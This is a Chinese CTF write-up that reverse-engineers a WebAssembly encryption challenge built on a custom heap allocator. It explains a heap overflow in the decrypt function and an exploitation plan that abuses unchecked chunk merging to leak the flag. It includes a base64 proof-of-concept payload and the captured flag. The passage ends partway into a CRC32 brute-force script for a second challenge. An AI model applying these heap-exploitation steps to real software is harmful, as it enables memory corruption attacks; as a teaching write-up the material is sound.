<p>enc&#x51FD;&#x6570;&#x5185;&#x90E8;&#x4F1A;&#x628A;key&#x62C6;&#x6210;4&#x5B57;&#x8282;&#x7684;4&#x90E8;&#x5206;&#xFF0C;&#x5229;&#x7528; mt_rand &#x4F5C;&#x4E3A;PRNG&#x628A;data&#x52A0;&#x5BC6;4&#x6B21;&#x3002;</p>
<p>&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x76F8;&#x540C;</p>
<p>&#x4F46;&#x770B;&#x8FD9;&#x4E2A;&#x52A0;&#x89E3;&#x5BC6;&#x662F;&#x62FF;&#x4E0D;&#x5230;flag&#x7684;&#xFF0C;&#x56E0;&#x4E3A;flag&#x5728;&#x6700;&#x5F00;&#x59CB;&#x5C31;&#x88AB;hash&#x4E86;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x9898;&#x5C31;&#x662F;pwn&#x5566;&#x3002;</p>
<p>&#x7136;&#x540E;&#x5806;&#x662F;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5176;&#x4E2D;</p>
<pre><code>    struct chunk {
        unsigned int size;
        unsigned int pre_size;
        struct chunk* fd;
    };
</code></pre><p>&#x9898;&#x5916;&#x8BDD;&#xFF0C;&#x81EA;&#x5DF1;&#x5199;&#x8FC7;&#x5806;&#x4E4B;&#x540E;&#x624D;&#x53D1;&#x73B0;&#x8FD9;&#x79CD;&#x7ED3;&#x6784;&#x662F;&#x4E0D;&#x53EF;&#x53D6;&#x7684;&#x554A;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;pre_size&#x7684;field&#x6CA1;&#x6CD5;&#x91CD;&#x5229;&#x7528;&#x4E86;&#x3002;&#x53CD;&#x6B63;&#x4E0D;&#x7BA1;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;pre_size&#x548C;fd&#x90FD;&#x4E0D;&#x4F1A;&#x91CD;&#x5229;&#x7528;&#xFF08;&#x5077;&#x61D2;&#xFF09;; &#x4E0D;&#x540C;size&#x7684;&#x5806;&#x5757;&#x653E;&#x5728;&#x4E0D;&#x540C;size&#x533A;&#x95F4;&#xFF08;&#x95F4;&#x9694;0x10&#xFF09;&#x7684;&#x5355;&#x94FE;&#x8868;&#x91CC;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x505A;align,</p>
<pre><code>`#define find_index(size) ((size/0x10) &gt; 0x20 ? 0x1f : (size/0x10)) ;`
</code></pre><p>&#x7528;&#x5355;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x4E86;&#x7C7B;&#x4F3C;unlink&#x4E00;&#x6837;&#x7684;&#x6548;&#x679C;&#xFF1A;</p>
<pre><code>    void unlink(struct chunk* current) {
        int index = find_index(current-&gt;size);
        struct chunk* ite = bins[index];
        if(ite != 0) {
            while(ite-&gt;fd != 0) {
                if(ite-&gt;fd == current) {
                    ite-&gt;fd = current-&gt;fd;
                    break;
                }
                ite = ite -&gt; fd;
            }
        }
    }
</code></pre><p>&#x4E5F;&#x53EF;&#x4EE5;&#x505A;merge&#xFF0C;&#x5177;&#x4F53;&#x6E90;&#x7801;&#x5728;github&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x57FA;&#x672C;&#x5168;&#x7A0B;&#x6CA1;&#x5565;check&#xFF0C;&#x4E00;&#x4E9B;glibc&#x7528;&#x4E0D;&#x5230;&#x7684;&#x6280;&#x5DE7;&#x90FD;&#x53EF;&#x4EE5;&#x7528;&#x4E86;&#xFF01;</p>
<p>&#x8BF4;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#xFF0C;&#x6D1E;&#x5728;&#x54EA;&#x5462;&#xFF1F;&#xFF1F;&#x4EE5;&#x4E0B;&#x4E3A;wasm2wast &#x8DD1;&#x51FA;&#x6765;wast&#x7684;&#x4E00;&#x90E8;&#x5206;</p>
<pre><code>    (export &quot;memory&quot; (memory 0))
      (import &quot;env&quot; &quot;grow&quot; (func (;0;) (type 1)))
      (import &quot;env&quot; &quot;read_data&quot; (func (;1;) (type 1)))
      (import &quot;env&quot; &quot;read_file&quot; (func (;2;) (type 2)))
      (import &quot;env&quot; &quot;read_pass&quot; (func (;3;) (type 1)))
      (import &quot;env&quot; &quot;read_random&quot; (func (;4;) (type 1)))
      &#x8FD9;&#x4E9B;&#x662F;&#x5185;&#x90E8;&#x51FD;&#x6570;&#x540C;import &#x51FD;&#x6570;&#x540D;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;
      (export &quot;malloc&quot; (func 5))
      (export &quot;unlink&quot; (func 6))
      (export &quot;free&quot; (func 7))
      (export &quot;Initialize&quot; (func 8))
      (export &quot;ExtractU32&quot; (func 9))
      (export &quot;hash&quot; (func 10))
      (export &quot;mycrypt&quot; (func 11))
      (export &quot;encrypt&quot; (func 12))
      (export &quot;decrypt&quot; (func 13))
      (export &quot;out_size&quot; (func 14))
      &#x8FD9;&#x4E9B;&#x662F;&#x5185;&#x90E8;&#x51FD;&#x6570;&#x4E0E;export &#x51FD;&#x6570;&#x540D;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;

      &#x6765;&#x770B;&#x770B;decrypt&#x51FD;&#x6570;
      (func (;13;) (type 0) (result i32)
        (local i32 i32 i32 i32 i32 i32 i32)
        i32.const 32
        call 5
        set_local 5
        i32.const 1024
        call 5
        set_local 0
        i32.const 8
        call 5
        set_local 1
        i32.const 16
        call 5
        set_local 2
        i32.const 2672
        get_local 5
        i32.const 32
        call 2
        drop
        get_local 0
        call 1
        set_local 3
        get_local 1
        call 3
        drop
        i32.const 0
        set_local 6
        block  ;; label = @1
          loop  ;; label = @2
            get_local 6
            i32.const 16
            i32.eq
            br_if 1 (;@1;)
            get_local 2
            get_local 6
            i32.add
            get_local 0
            get_local 6
            i32.add
            i32.load8_u
            i32.store8
            get_local 6
            i32.const 1
            i32.add
            set_local 6
            br 0 (;@2;)
          end
        end
        get_local 5
        i32.const 32
        call 10
        set_local 4
        i32.const 0
        set_local 6
        block  ;; label = @1
          loop  ;; label = @2
            get_local 6
            i32.const 8
            i32.eq
            br_if 1 (;@1;)
            get_local 4
            get_local 6
            i32.add
            tee_local 5
            get_local 5
            i32.load8_u
            get_local 1
            get_local 6
            i32.add
            i32.load8_u
            i32.xor
            i32.store8
            get_local 6
            i32.add
            i32.load8_u
            i32.xor
            i32.store8
            get_local 6
            i32.const 1
            i32.add
            set_local 6
            br 0 (;@2;)
          end
        end
        get_local 1
        call 7
        get_local 4
        i32.const 16
        call 10
        set_local 1
        get_local 4
        call 7
        i32.const 0
        set_local 6
        block  ;; label = @1
          loop  ;; label = @2
            get_local 6
            i32.const 16
            i32.eq
            br_if 1 (;@1;)
            get_local 1
            get_local 6
            i32.add
            tee_local 5
            get_local 5
            i32.load8_u
            get_local 2
            get_local 6
            i32.add
            i32.load8_u
            i32.xor
            i32.store8
            get_local 6
            i32.const 1
            i32.add
            set_local 6
            br 0 (;@2;)
          end
        end
        get_local 2
        call 7
        get_local 1
        get_local 0
        i32.const 16
        i32.add
        get_local 3
        call 5
        tee_local 6
        get_local 3
        i32.const -16
        i32.add
        tee_local 2
        call 11
        i32.const 0
        get_local 2
        i32.store offset=2680
        get_local 0
        call 7
        get_local 6)

&#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x957F;&#xFF0C;&#x628A;&#x8FD9;&#x4E2A;decrypt&#x51FD;&#x6570;&#x7A0D;&#x5FAE;&#x7FFB;&#x8BD1;&#x4E0B;&#xFF1A;

    &#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x957F;&#xFF0C;&#x628A;&#x8FD9;&#x4E2A;decrypt&#x51FD;&#x6570;&#x7A0D;&#x5FAE;&#x7FFB;&#x8BD1;&#x4E0B;&#xFF1A;
        (func (;decrypt;) (type 0) (result i32)
        (local i32 i32 i32 i32 i32 i32 i32)
        i32.const 32
        call malloc 
        set_local 5             // var_5 = malloc(32);
        i32.const 1024
        call malloc
        set_local 0             // var_0 = malloc(1024);
        i32.const 8             
        call malloc
        set_local 1             // var_1 = malloc(8);
        i32.const 16
        call malloc
        set_local 2             // var_2 = malloc(16);
        i32.const 2672
        get_local 5             
        i32.const 32
        call read_file          // readfile(21, var_5, 2672);
        drop
        get_local 0
        call read_data          
        set_local 3             // var_3 = read_data(var_0);
        get_local 1
        call read_pass          // read_pass(var_1);
        drop
        i32.const 0
        set_local 6             // var_6 = 0;
        block  ;; label = @1
          loop  ;; label = @2       // while;
            get_local 6
            i32.const 16
            i32.eq
            br_if 1 (;@1;)          // if(var_6 == 16) break;
            get_local 2
            get_local 6
            i32.add             //  var_2 + var_6;
            get_local 0
            get_local 6
            i32.add             //  var_0 + var_6;
            i32.load8_u         
            i32.store8          // *(var_2 + var_6) = *(var_0+var_6);
            get_local 6
            i32.const 1
            i32.add             
            set_local 6
            br 0 (;@2;)         // var_6 += 1;
          end
        end
        get_local 5
        i32.const 32
        call hash               
        set_local 4             // var_4 = hash(var_5, 32);
        i32.const 0
        set_local 6             // var_6 = 0;
        block  ;; label = @1
          loop  ;; label = @2
            get_local 6
            i32.const 8
            i32.eq
            br_if 1 (;@1;)          // if(var_6 == 8) break;
            get_local 4
            get_local 6
            i32.add             // var_4 + var_6;
            tee_local 5         // var_5 = var_4 + var_6
            get_local 5
            i32.load8_u         // *var_5;
            get_local 1
            get_local 6
            i32.add             // var_1 + var_6;
            i32.load8_u         // *(var_1 + var_6);
            i32.xor
            i32.store8          // *(var_4 + var_6) ^= *var_5;
            get_local 6
            i32.const 1
            i32.add
            set_local 6         // var_6 += 1;
            br 0 (;@2;)
          end
        end
        get_local 1
        call free               // free(var_!);
        get_local 4
        i32.const 16
        call hash               
        set_local 1             // var_1 = hash(var_4, 16)
        get_local 4
        call free               // free(var_4);
        i32.const 0
        set_local 6             // var_6 = 0;
        block  ;; label = @1
          loop  ;; label = @2
            get_local 6
            i32.const 16
            i32.eq
            br_if 1 (;@1;)          // if(var_6 == 16) break;
            get_local 1
            get_local 6
            i32.add
            tee_local 5
            get_local 5
            i32.load8_u
            get_local 2
            get_local 6
            i32.add
            i32.load8_u
            i32.xor
            i32.store8          // &#x548C;&#x4E4B;&#x524D;&#x4E00;&#x6837;(var_1 + var_6) ^= (var_2 + var_6);
            get_local 6
            i32.const 1
            i32.add
            set_local 6         // var_6 += 1;
            br 0 (;@2;)
          end
        end
        get_local 2
        call free               // free(var_2);
        get_local 1             // var_1
        get_local 0
        i32.const 16
        i32.add             // var_0 + 16
        get_local 3
        call malloc             // out = malloc(var_3);
        tee_local 6
        get_local 3             
        i32.const -16
        i32.add             // var_3 - 16
        tee_local 2             // var2 = var_3 - 16
        call mycrypt            // mycrypt(var_1 ,var_0 + 16, out, var_3 - 16)
        i32.const 0
        get_local 2
        i32.store offset=2680       // *(2680) = var_2;
        get_local 0
        call free               // free(var_0);
        get_local 6)
</code></pre><p>&#x8FD9;&#x6837;&#x5C31;&#x7FFB;&#x8BD1;&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x5E94;&#x8BE5;&#x548C;&#x6211;&#x5F00;&#x59CB;&#x5BF9;&#x52A0;&#x89E3;&#x5BC6;&#x7684;&#x63CF;&#x8FF0;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;js&#x5C42;&#x4F20;&#x5165;&#x7684;data&#x957F;&#x5EA6;&#x6700;&#x957F;&#x53EF;&#x4EE5;&#x6709;0x1000&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x4F46;&#x4ECE;decrypt&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x770B;&#x51FA;data&#x8FD9;&#x53EA;malloc&#x4E86;1024&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x4E8E;&#x662F;&#x591A;&#x51FA;&#x6765;&#x7684;&#x5C31;&#x9020;&#x6210;&#x4E86;&#x4E00;&#x4E2A;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7C7B;&#x4F3C;&#x65B9;&#x5F0F;&#xFF08;&#x624B;&#x5DE5;&#xFF09;&#x5BF9;&#x5176;&#x4ED6;&#x51FD;&#x6570;&#x5305;&#x62EC;malloc&#x548C;free&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x9006;&#x5411;&#xFF0C;&#x867D;&#x7136;&#x5DE5;&#x4F5C;&#x4F1A;&#x8270;&#x8F9B;&#x5F88;&#x591A;233&#x3002;</p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5229;&#x7528;&#xFF0C;&#x6765;&#x770B;&#x770B;&#x5F00;&#x59CB;&#x7684;&#x90A3;&#x51E0;&#x4E2A;malloc&#x4E4B;&#x540E;&#x7684;layout</p>
<pre><code>    heapbase:               flag
    key+32+12:              data
    data+1024+12:               pass
    pass+8+12:              random
</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;data&#x4E0B;&#x9762;&#x5C31;&#x662F;pass&#x548C;random&#xFF0C;&#x9664;&#x4E86;flag&#x6CA1;&#x6709;&#x88AB;free&#xFF08;&#x8FD9;&#x662F;&#x6211;&#x89C9;&#x5F97;&#x5F3A;&#x884C;&#x51FA;&#x9898;&#x7684;&#x4E00;&#x70B9;&#x3002;&#x3002;&#x3002;&#xFF09;&#xFF0C;&#x4E0B;&#x9762;&#x7684;pass&#x548C;random&#x90FD;&#x4F1A;&#x5728;&#x7528;&#x5B8C;&#x4E4B;&#x540E;&#x88AB;free&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x60F3;&#x60F3;&#x600E;&#x4E48;&#x628A;flag leak&#x51FA;&#x6765;&#x5427;&#xFF01;</p>
<hr>
<p>&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x90E8;&#x5206;&#x53EF;&#x80FD;&#x5BF9;&#x4E0D;&#x4E86;&#x89E3;&#x5806;&#x5185;&#x90E8;&#x7684;&#x4EBA;&#x5F88;&#x6A21;&#x7CCA;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x770B;&#x8FC7;&#x6E90;&#x7801;&#x6216;&#x8005;&#x81EA;&#x5DF1;&#x9006;&#x8FC7;&#x5C31;&#x522B;&#x770B;&#x4E86;====</p>
<p>&#x9ED8;&#x8BA4;&#x4F60;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x5806;&#x548C;&#x52A0;&#x89E3;&#x5BC6;&#x90E8;&#x5206;&#x7684;&#x5B9E;&#x73B0;&#x4E86;&#x3002;</p>
<p>&#x53EF;&#x4EE5;&#x60F3;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#x8BA9;&#x6700;&#x540E;output&#x6307;&#x9488;malloc&#x5230;flag&#x524D;&#x9762;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;2680&#x90A3;&#x4E2A;outsize&#x5230;&#x5408;&#x9002;&#x5927;&#x5C0F;&#xFF08;&#x5982;&#x679C;&#x5927;&#x5C0F;&#x8D85;&#x8FC7;&#x4E86;memory&#x957F;&#x5EA6;&#xFF0C;&#x4E0D;&#x4F1A;&#x53CD;&#x56DE;&#x7ED3;&#x679C;&#xFF09;&#x3002;&#x95EE;&#x9898;&#x662F;&#x5728;&#x4E8E;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x505A;&#x7684;&#xFF1A;</p>
<ul>
<li><ol>
<li>&#x5728;&#x7A0B;&#x5E8F;&#x5F00;&#x59CB;&#x7684;&#x65F6;&#x5019;&#x6EA2;&#x51FA;data&#x5757;&#xFF0C;&#x80FD;&#x62FF;&#x5230;&#x4E24;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x5373;&#x5C06;&#x88AB;free&#x7684;&#x5806;&#x5757;</li>
</ol>
</li>
<li><ol>
<li>&#x6700;&#x540E;&#x4FEE;&#x6539;outsize&#x7684;&#x65F6;&#x5019;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x5C31;&#x662F;free(data); &#x4E5F;&#x5C31;&#x662F;&#x5F97;&#x5728;free&#x4E4B;&#x540E;&#x6539;&#x6389;2680&#x90A3;&#x4E2A;size</li>
</ol>
</li>
</ul>
<p>&#x505A;&#x5230;&#x8FD9;&#x4E24;&#x70B9;&#x5728;glibc&#x91CC;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x4F46;&#x8FD9;&#x4E2A;&#x5806;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;check&#x3002;</p>
<p>&#x505A;&#x5230;&#x8FD9;&#x4E2A;&#x7684;&#x6700;&#x5173;&#x952E;&#x7684;&#x4E00;&#x70B9;&#x5728;merge&#x7684;&#x65F6;&#x5019;</p>
<pre><code>    void free(unsigned char* ptr) {
        struct chunk* current = to_chunk(ptr);
        struct chunk* next = next_chunk(current);
        if(!(current-&gt;size &amp; 1)) {
            struct chunk* pre = to_mem(current) - current-&gt;pre_size - 12;
            pre-&gt;size += ((current-&gt;size&amp;0xfffffffe) + 12);
            // unlink pre
            unlink(pre);
            current = pre;
        }
        ...
    }
</code></pre><p>&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x7684;check&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x80FD;&#x628A;&#x5F53;&#x524D;&#x7684;size&#x52A0;&#x5230;prev&#x5757;&#x7684;size&#x4F4D;&#x4E0A;&#xFF0C;&#x4F46;prev&#x5757;&#x7684;size&#x4F4D;&#x7684;&#x4F4D;&#x7F6E;&#x662F;&#x7531;&#x5F53;&#x524D;&#x5806;&#x5757;&#x7684;pre_size&#x4F4D;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x80FD;&#x5728;&#x524D;&#x9762;&#x4EFB;&#x610F;&#x4F4D;&#x7F6E;&#x52A0;&#x4E0A;&#x5F53;&#x524D;size&#xFF0C;&#x53EA;&#x662F;&#x8FD9;&#x4E2A;size&#x4E0D;&#x80FD;&#x592A;&#x5927;&#xFF0C;&#x4E0D;&#x7136;&#x5728;&#x627E;&#x5F53;&#x524D;&#x5757;&#x7684;&#x4E0B;&#x4E00;&#x5757;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8D85;&#x51FA;memory&#x957F;&#x5EA6;&#x3002;</p>
<p>&#x73B0;&#x5728;&#x6709;&#x4EFB;&#x610F;&#x5199;&#x4E86;&#xFF0C;&#x4F46;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x8981;&#x505A;&#x5230;&#x8FD9;&#x70B9;&#x5F97;&#x628A;&#x5F53;&#x524D;&#x5757;&#x7684;inuse&#x4F4D;&#x6E05;0&#xFF0C;&#x800C;data&#x5757;&#x8981;&#x6539;inuse&#x4F4D;&#x4E0D;&#x5BB9;&#x6613;&#x3002;&#x56E0;&#x4E3A;&#x4E0A;&#x9762;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5806;&#x5757;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x4E0D;&#x80FD;&#x62FF;&#x4E24;&#x4E2A;&#x80FD;&#x6EA2;&#x51FA;&#x7684;&#x5806;&#x5757;&#x4E2D;&#x4E00;&#x4E2A;&#x5806;&#x5757;&#x6539;size&#xFF0C;&#x56E0;&#x4E3A;&#x53EA;&#x80FD;&#x52A0;&#x4E0A;&#x5076;&#x6570;&#x7684;size&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x6539;&#x53D8;size&#x7684;inuse&#x4F4D;&#x3002;</p>
<p>&#x6CA1;&#x6709;&#x5806;&#x5757;&#x5C31;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x5806;&#x5757;&#xFF01;free&#x7684;&#x65F6;&#x5019;&#x4F1A;merge&#x4E0A;&#x9762;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x7136;&#x540E;merge&#x4E4B;&#x540E;&#x7684;&#x90A3;&#x4E2A;size&#x6211;&#x4EEC;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x5728;free&#x7684;&#x6700;&#x540E;&#xFF0C;&#x4F1A;&#x6E05;&#x7A7A;&#x4E0B;&#x4E00;&#x5757;&#x7684;inuse&#x4F4D;&#x7136;&#x540E;&#x8BBE;&#x7F6E;pre_size</p>
<pre><code>    // link current to bins
        int index = find_index(current-&gt;size);
        current-&gt;fd = bins[index];
        bins[index] = current;
        // clear next chunk&apos;s inuse bit and set the pre_size
        next = next_chunk(current);
        next-&gt;size &amp;= 0xfffffffe;
        next-&gt;pre_size = current-&gt;size&amp;0xfffffffe;
</code></pre><p>&#x90A3;&#x4E48;&#x601D;&#x8DEF;&#x5C31;&#x51FA;&#x6765;&#x4E86;&#xFF1A;</p>
<ul>
<li><ol>
<li>&#x8986;&#x76D6;pass&#x5806;&#x5757;&#xFF0C;&#x4F7F;&#x5176;merge&#x5B8C;&#x7684;&#x7ED3;&#x679C;&#x5728;data&#x4E0A;&#x9762;&#xFF0C;&#x540C;&#x65F6;&#x8BBE;&#x7F6E;data&#x5757;&#x7684;size&#x5B57;&#x6BB5;</li>
</ol>
</li>
<li><ol>
<li>&#x8986;&#x76D6;random&#x5806;&#x5757;&#xFF0C;&#x8BBE;&#x7F6E;data&#x5757;&#x7684;pre_size</li>
</ol>
</li>
<li><ol>
<li>malloc output&#x7684;&#x7ED3;&#x679C;&#x4F1A;&#x5230;key&#x4E0A;&#x9762;&#x90A3;&#x6BB5;</li>
</ol>
</li>
<li><ol>
<li>free data&#x5757;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x80FD;&#x628A;size&#x52A0;&#x5230;outsize&#xFF0C;&#x8FBE;&#x5230;leak</li>
</ol>
</li>
</ul>
<p>&#x7136;&#x800C;&#x5B9E;&#x9645;&#x64CD;&#x4F5C;&#x4E2D;&#x4E24;&#x4E2A;free&#x7684;&#x5806;&#x5757;&#x5728;bins&#x4E2D;&#x7684;&#x957F;&#x5EA6;&#x90FD;&#x4F1A;&#x8D85;&#x8FC7;0x200&#x7136;&#x540E;&#x5206;&#x5230;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#xFF0C;output&#x4F1A;&#x4F18;&#x5148;&#x53D6;random&#x5806;&#x5757;free&#x7684;&#x90A3;&#x5757;&#x3002;&#x6240;&#x4EE5;&#x5F97;&#x628A;1&#xFF0C;2&#x7684;&#x64CD;&#x4F5C;&#x53CD;&#x4E00;&#x4E0B;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x9898;&#x5C31;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x53EF;&#x559C;&#x53EF;&#x8D3A;&#xFF08;</p>
<p>ps&#xFF1A;&#x51FA;&#x9898;&#x4EBA;&#x6CA1;&#x6709;&#x6E90;&#x7801;&#x5927;&#x6982;&#x4E5F;&#x6CA1;&#x6CD5;&#x505A;&#x51FA;&#x6765;</p>
<p>pps&#xFF1A;&#x5199;&#x5806;&#x7BA1;&#x7406;&#x5F88;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x51FA;&#x5B8C;&#x9898;&#x770B;&#x7740;&#x6E90;&#x7801;&#x81EA;&#x5DF1;&#x65E5;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x9898;&#x8FD8;&#x65E5;&#x4E86;&#x4E00;&#x6574;&#x5929;&#x4E5F;&#x5F88;&#x6709;&#x610F;&#x601D;</p>
<p>ppps&#xFF1A;&#x6BD4;&#x8D5B;&#x5B8C;&#x518D;&#x9006;&#x4E00;&#x904D;&#x81EA;&#x5DF1;&#x7684;&#x9898;&#x4E0D;&#x5BB9;&#x6613;&#xFF0C;&#x5404;&#x4F4D;&#x8981;&#x6253;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x8BF7;&#x624B;&#x4E0B;&#x7559;&#x60C5;orz</p>
<p>poc&#xFF1A;</p>
<pre><code class="lang-MTIzNDU2NzgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJD1AAD8AwAAAAAAAGFhYWFhYWFhXAQAAJgIAAAAAAAA">```
&#x7ED3;&#x679C;&#xFF1A;
</code></pre>
<pre><code>&#xFFFD;&#xFFFD;n&#xFFFD;&amp;&#xFFFD;&#xFFFD;A&#xFFFD;t&#xFFFD;&#xFFFD;&#xFFFD;oe&#xFFFD;&#xFFFD;.^&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;S&#xFFFD;;c&#xFFFD;d3&#xFFFD;&lt;&#xFFFD;&#xFFFD;&#xFFFD;g&#xFFFD;&quot;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;X&#xFFFD;&#xFFFD;
                                                                                *   &#xFFFD;&#xFFFD;?&#xFFFD;&#xFFFD;&#xFFFD;vm
&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;F &#xFFFD;|&#xFFFD;D+&#xFFFD;&#xFFFD;}u&#xFFFD;e&#xFFFD;&#xFFFD;bq&#xFFFD;&#xFFFD;&#xFFFD;&#xC4;&#xFFFD;**!
                             &#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;&#xFFFD;!hctf{MaYb3_heAp_15_AlS0_HARD428}t&#xFFFD;&#xFFFD;5678&#xFFFD;&#xFFFD;&#xFFFD;12345678\
</code></pre><pre><code>### big_zip

&#x7531;&#x4E8E;github&#x4E0A;&#x6709;&#x5BF9;6&#x4F4D;&#x7684;crc32&#x7684;&#x5FEB;&#x901F;&#x7206;&#x7834;&#x811A;&#x672C;&#xFF0C;&#x6545;&#x5C06;&#x6587;&#x672C;&#x5206;&#x4E3A;5&#x5B57;&#x8282;&#x3002;&#x5176;&#x5B9E;&#x53EA;&#x8981;&#x5C06;github&#x4E0A;&#x7684;&#x4EE3;&#x7801;&#x7A0D;&#x7A0D;&#x6539;&#x52A8;&#x5C31;&#x80FD;&#x5FEB;&#x901F;&#x7834;&#x89E3;5&#x4F4D;&#x7684;crc32&#x4E86;&#x3002;
</code></pre><p># -<em>- coding: utf-8 -</em>-</p>
<p>import itertools
import binascii
import string</p>
<p>class crc32_reverse_class(object):
    # the code is modified from <a href="https://github.com/theonlypwner/crc32/blob/master/crc32.py" target="_blank">https://github.com/theonlypwner/crc32/blob/master/crc32.py</a>
    def __init__(self, crc32, length, tbl=string.printable,
                 poly=0xEDB88320, accum=0):
        self.char_set = set(map(ord, tbl))
        self.crc32 = crc32
        self.length = length
        self.poly = poly
        self.accum = accum
        self.table = []
        self.table_reverse = []</p>
<pre><code>def init_tables(self, poly, reverse=True):
    \# build CRC32 table
    for i in range(256):
        for j in range(8):
            if i &amp; 1:
